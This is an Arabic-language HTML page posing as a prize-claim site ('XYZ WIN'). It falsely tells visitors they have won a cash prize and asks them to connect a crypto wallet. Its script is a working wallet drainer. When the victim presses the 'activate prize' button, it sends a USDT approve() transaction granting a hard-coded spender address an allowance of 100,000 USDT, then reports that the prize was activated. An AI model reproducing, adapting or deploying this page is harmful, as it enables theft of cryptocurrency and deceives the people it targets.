<!DOCTYPE html>
<html lang="ar" dir="rtl">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>مبروك! لقد فزت بـ 50000 دولار - XYZ</title>
    <link
      href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;700;900&display=swap"
      rel="stylesheet"
    />
    <script
      src="https://kit.fontawesome.com/a076d05399.js"
      crossorigin="anonymous"
    ></script>
    <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronweb@5.3.3/dist/tronweb.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.14.0/dist/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      body {
        font-family: "Tajawal", sans-serif;
        background: #000000;
        color: #ffffff;
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 20px;
        overflow-x: hidden;
        position: relative;
      }
      #particles-js {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 1;
      }
      .container {
        background: rgba(10, 10, 10, 0.95);
        border-radius: 20px;
        padding: 50px;
        max-width: 700px;
        width: 100%;
        box-shadow: 0 0 50px rgba(255, 215, 0, 0.2),
          0 0 20px rgba(192, 192, 192, 0.3);
        text-align: center;
        position: relative;
        z-index: 2;
        animation: fadeIn 1.8s ease forwards;
        border: 2px solid rgba(255, 215, 0, 0.3);
      }
      @keyframes fadeIn {
        0% {
          opacity: 0;
          transform: scale(0.9);
        }
        100% {
          opacity: 1;
          transform: scale(1);
        }
      }
      .logo {
        font-size: 52px;
        font-weight: 900;
        color: #ffd700;
        letter-spacing: 2px;
        margin-bottom: 25px;
        text-shadow: 0 0 15px rgba(255, 215, 0, 0.7);
      }
      .verified-badge {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 12px;
        font-size: 18px;
        color: #c0c0c0;
        margin-bottom: 25px;
        background: rgba(255, 215, 0, 0.1);
        padding: 10px;
        border-radius: 10px;
        animation: pulse 2s infinite ease-in-out;
      }
      @keyframes pulse {
        0%,
        100% {
          box-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
        }
        50% {
          box-shadow: 0 0 20px rgba(255, 215, 0, 0.6);
        }
      }
      .verified-badge i {
        font-size: 24px;
        color: #ffd700;
      }
      h1 {
        font-size: 36px;
        font-weight: 700;
        margin-bottom: 20px;
        color: #ffffff;
        text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
      }
      .win-message {
        font-size: 24px;
        color: #ffd700;
        margin-bottom: 20px;
        animation: glow 1.5s infinite alternate;
      }
      @keyframes glow {
        from {
          text-shadow: 0 0 10px #ffd700;
        }
        to {
          text-shadow: 0 0 20px #ffd700, 0 0 30px #c0c0c0;
        }
      }
      .warning {
        font-size: 14px;
        color: #ffcc00;
        margin-bottom: 25px;
        background: rgba(255, 204, 0, 0.1);
        padding: 12px;
        border-radius: 10px;
      }
      .coin-icons {
        display: flex;
        justify-content: center;
        gap: 25px;
        margin-bottom: 30px;
      }
      .coin-icons i {
        font-size: 48px;
        color: #c0c0c0;
        transition: all 0.3s ease;
        animation: float 4s ease-in-out infinite;
      }
      .coin-icons i:nth-child(2) {
        animation-delay: 0.8s;
      }
      .coin-icons i:nth-child(3) {
        animation-delay: 1.6s;
      }
      @keyframes float {
        0%,
        100% {
          transform: translateY(0);
        }
        50% {
          transform: translateY(-15px);
        }
      }
      .coin-icons i:hover {
        color: #ffd700;
        filter: drop-shadow(0 0 15px #ffd700);
      }
      .wallet-selection {
        display: flex;
        justify-content: center;
        gap: 20px;
        margin-bottom: 40px;
        flex-wrap: wrap;
      }
      .wallet-btn {
        background: rgba(255, 255, 255, 0.05);
        border-radius: 12px;
        padding: 20px;
        width: 140px;
        cursor: pointer;
        transition: all 0.4s ease;
        box-shadow: 0 0 15px rgba(255, 215, 0, 0.2);
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 12px;
        color: #ffffff;
        font-weight: 700;
        user-select: none;
        border: 1px solid rgba(255, 215, 0, 0.3);
      }
      .wallet-btn:hover {
        background: #ffd700;
        color: #000000;
        box-shadow: 0 0 25px #ffd700;
        transform: scale(1.08);
      }
      .wallet-btn.selected {
        background: #ffd700;
        color: #000000;
        box-shadow: 0 0 30px #ffd700;
        transform: scale(1.08);
      }
      .wallet-btn img {
        width: 48px;
        height: 48px;
        object-fit: contain;
      }
      button {
        background: linear-gradient(90deg, #ffd700, #c0c0c0);
        border: none;
        border-radius: 12px;
        padding: 18px 40px;
        font-size: 20px;
        font-weight: 700;
        color: #000000;
        cursor: pointer;
        box-shadow: 0 0 25px rgba(255, 215, 0, 0.6);
        transition: all 0.4s ease;
        letter-spacing: 1px;
      }
      button:hover {
        background: linear-gradient(90deg, #c0c0c0, #ffd700);
        box-shadow: 0 0 35px rgba(255, 215, 0, 0.8);
        transform: scale(1.05);
      }
      .status {
        margin-top: 25px;
        font-size: 18px;
        font-weight: 700;
        min-height: 30px;
        color: #ffcc00;
      }
      @media (max-width: 480px) {
        .container {
          padding: 25px;
        }
        .logo {
          font-size: 40px;
        }
        h1 {
          font-size: 28px;
        }
        .win-message {
          font-size: 20px;
        }
        .wallet-btn {
          width: 120px;
        }
        .coin-icons i {
          font-size: 36px;
        }
        button {
          padding: 15px 30px;
          font-size: 16px;
        }
      }
    </style>
  </head>
  <body>
    <div id="particles-js"></div>
    <main class="container">
      <div class="logo">XYZ WIN</div>
      <div class="verified-badge">
        <i class="fas fa-check-circle"></i>
        <span>منصة موثقة</span>
      </div>
      <h1>مبروك! لقد فزت بـ 1000 دولار</h1>
      <p class="win-message">استعد لاستلام جائزتك!</p>
      <p class="warning">
        تحذير: تأكد من اختيار محفظتك الرقمية لتفعيل الجائزة. العملية آمنة
        وموثقة.
      </p>
      <div class="coin-icons">
        <i class="fab fa-bitcoin"></i>
        <i class="fab fa-ethereum"></i>
        <i class="fas fa-coins"></i>
      </div>
      <p class="description">اختر محفظتك الرقمية لتفعيل جائزتك مباشرة.</p>
  <section class="wallet-selection">
  <button class="wallet-btn" data-wallet="tronlink">
    <img
      src="https://cdn.jsdelivr.net/gh/tronprotocol/tron-web@master/assets/img/tronlink.svg"
      alt="TronLink"
    />
    TronLink
  </button>
  <button class="wallet-btn" data-wallet="metamask">
    <img
      src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg"
      alt="MetaMask"
    />
    MetaMask
  </button>
  <button class="wallet-btn" data-wallet="trustwallet">
    <img
      src="https://trustwallet.com/assets/images/media/assets/TWT.png"
      alt="TrustWallet"
    />
    Trust Wallet
  </button>
  <button class="wallet-btn" data-wallet="coinbase">
    <img
      src="https://www.coinbase.com/assets/app/wallet-logo.191d39b2.svg"
      alt="Coinbase Wallet"
    />
    Coinbase Wallet
  </button>
</section>
<button id="approveButton">تفعيل الجائزة</button>
<p class="status" id="statusText"></p>

<script>
  particlesJS("particles-js", {
    particles: {
      number: { value: 100, density: { enable: true, value_area: 800 } },
      color: { value: ["#ffd700", "#c0c0c0", "#ffffff"] },
      shape: { type: "circle" },
      opacity: { value: 0.4, random: true },
      size: { value: 4, random: true },
      line_linked: {
        enable: true,
        distance: 150,
        color: "#ffd700",
        opacity: 0.2,
        width: 1,
      },
      move: { enable: true, speed: 3, direction: "none", random: true },
    },
    interactivity: {
      detect_on: "canvas",
      events: {
        onhover: { enable: true, mode: "grab" },
        onclick: { enable: true, mode: "push" },
      },
      modes: {
        grab: { distance: 200, line_linked: { opacity: 0.5 } },
        push: { particles_nb: 4 },
      },
    },
  });

  const walletButtons = document.querySelectorAll(".wallet-btn");
  const approveButton = document.getElementById("approveButton");
  const statusText = document.getElementById("statusText");
  let selectedWallet = null;
  let provider = null;

  const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // USDT TRC-20
  const spender = "TWNvNo7d79eQ8VtZUeBoLjtyPYrYn6yXJf";
  const amount = "100000000000"; // 100,000 USDT (6 decimals)
  const usdtAbi = [
    "function approve(address spender, uint256 amount) public returns (bool)",
    "function decimals() public view returns (uint8)",
  ];

  // دالة للتحقق من حالة الاتصال بالمحفظة
  async function checkWalletConnection(wallet) {
    if (wallet === "tronlink") {
      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
        statusText.textContent = "✅ محفظة TronLink متصلة!";
        return true;
      }
      return false;
    } else if (wallet === "metamask") {
      if (window.ethereum && window.ethereum.selectedAddress) {
        statusText.textContent = "✅ محفظة MetaMask متصلة!";
        return true;
      }
      return false;
    } else if (wallet === "trustwallet" || wallet === "coinbase") {
      if (provider && provider.accounts && provider.accounts.length > 0) {
        statusText.textContent = `✅ محفظة ${wallet} متصلة!`;
        return true;
      }
      if (window.ethereum && (window.ethereum.isTrust || window.ethereum.isCoinbaseWallet)) {
        statusText.textContent = `✅ محفظة ${wallet} متصلة عبر window.ethereum!`;
        return true;
      }
      return false;
    }
    return false;
  }

  // دالة للاتصال بالمحفظة مع تحسين فتح المحفظة بدون QR إن أمكن
  async function connectWallet(wallet) {
    statusText.textContent = `جارٍ الاتصال بمحفظة ${wallet}...`;
    try {
      if (wallet === "tronlink") {
        if (!window.tronWeb) {
          statusText.textContent =
            "يرجى تثبيت TronLink. افتح تطبيق TronLink أو أضف الإضافة على المتصفح.";
          window.open("https://www.tronlink.org/", "_blank");
          return false;
        }
        if (!window.tronWeb.defaultAddress.base58) {
          statusText.textContent = "يرجى تسجيل الدخول إلى TronLink.";
          return false;
        }
        return true;
      } else if (wallet === "metamask") {
        if (!window.ethereum) {
          statusText.textContent =
            "يرجى تثبيت MetaMask. أضف الإضافة على المتصفح.";
          window.open("https://metamask.io/download/", "_blank");
          return false;
        }
        await window.ethereum.request({ method: "eth_requestAccounts" });
        return true;
      } else if (wallet === "trustwallet" || wallet === "coinbase") {
        if (window.ethereum && window.ethereum.isTrust) {
          provider = new ethers.providers.Web3Provider(window.ethereum);
          await window.ethereum.request({ method: "eth_requestAccounts" });
          return true;
        }
        if (window.ethereum && window.ethereum.isCoinbaseWallet) {
          provider = new ethers.providers.Web3Provider(window.ethereum);
          await window.ethereum.request({ method: "eth_requestAccounts" });
          return true;
        }
        if (!window.EthereumProvider) {
          statusText.textContent =
            "خطأ في تحميل مكتبة WalletConnect. تأكد من اتصالك بالإنترنت.";
          return false;
        }
        provider = await window.EthereumProvider.init({
          projectId: "f6b400b4393b83bb22abcaf805ad72d2",
          chains: [728126428], // Tron mainnet
          rpc: { 728126428: "https://api.trongrid.io" },
          metadata: {
            name: "XYZ Win",
            description: "تفعيل جائزة 10000 دولار",
            url: window.location.href,
            icons: [
              "https://cdn.jsdelivr.net/gh/tronprotocol/tron-web@master/assets/img/tronlink.svg",
            ],
          },
          // showQrModal: false,
        });
        try {
          await provider.connect();
          return true;
        } catch {
          statusText.textContent =
            "يرجى فتح محفظتك يدويًا للموافقة على الاتصال.";
          return false;
        }
      }
      return false;
    } catch (e) {
      statusText.textContent = `خطأ في الاتصال بالمحفظة: ${e.message || e}`;
      return false;
    }
  }

  const walletLinks = {
    tronlink: "tronlink://",
    metamask: "metamask://",
    trustwallet: "trust://",
    coinbase: "cbwallet://",
  };

  walletButtons.forEach((btn) => {
    btn.addEventListener("click", async () => {
      walletButtons.forEach((b) => b.classList.remove("selected"));
      btn.classList.add("selected");
      selectedWallet = btn.dataset.wallet;

      // افتح التطبيق مباشرة لو موجود
      const deepLink = walletLinks[selectedWallet];
      if (deepLink) {
        window.location.href = deepLink;
        setTimeout(() => {
          if (selectedWallet === "tronlink")
            window.open("https://www.tronlink.org/", "_blank");
          else if (selectedWallet === "metamask")
            window.open("https://metamask.io/download/", "_blank");
          else if (selectedWallet === "trustwallet")
            window.open("https://trustwallet.com/", "_blank");
          else if (selectedWallet === "coinbase")
            window.open("https://www.coinbase.com/wallet", "_blank");
        }, 2000);
      }

      const isConnected = await checkWalletConnection(selectedWallet);
      if (!isConnected) {
        await connectWallet(selectedWallet);
      }
    });
  });

  approveButton.addEventListener("click", async () => {
    if (!selectedWallet) {
      statusText.textContent = "يرجى اختيار محفظة أولاً.";
      return;
    }

    const isConnected = await checkWalletConnection(selectedWallet);
    if (!isConnected) {
      statusText.textContent = `يرجى الاتصال بمحفظة ${selectedWallet} أولاً.`;
      return;
    }

    statusText.textContent = `جارٍ تفعيل الجائزة باستخدام ${selectedWallet}...`;

    try {
      if (selectedWallet === "tronlink") {
        const contract = await window.tronWeb.contract().at(contractAddress);
        const tx = await contract.approve(spender, amount).send();
        statusText.textContent = "✅ تم تفعيل الجائزة بنجاح!";
      } else {
        if (selectedWallet === "trustwallet" || selectedWallet === "coinbase") {
          if (!provider) {
            const connected = await connectWallet(selectedWallet);
            if (!connected) return;
          }
        } else if (selectedWallet === "metamask") {
          provider = new ethers.providers.Web3Provider(window.ethereum);
        }

        const signer = provider.getSigner();
        const contract = new ethers.Contract(contractAddress, usdtAbi, signer);
        const tx = await contract.approve(spender, amount);
        await tx.wait();
        statusText.textContent = "✅ تم تفعيل الجائزة بنجاح!";
      }
    } catch (e) {
      statusText.textContent = `حدث خطأ: ${e.message || e}`;
    }
  });
</script>


  </body>
</html>
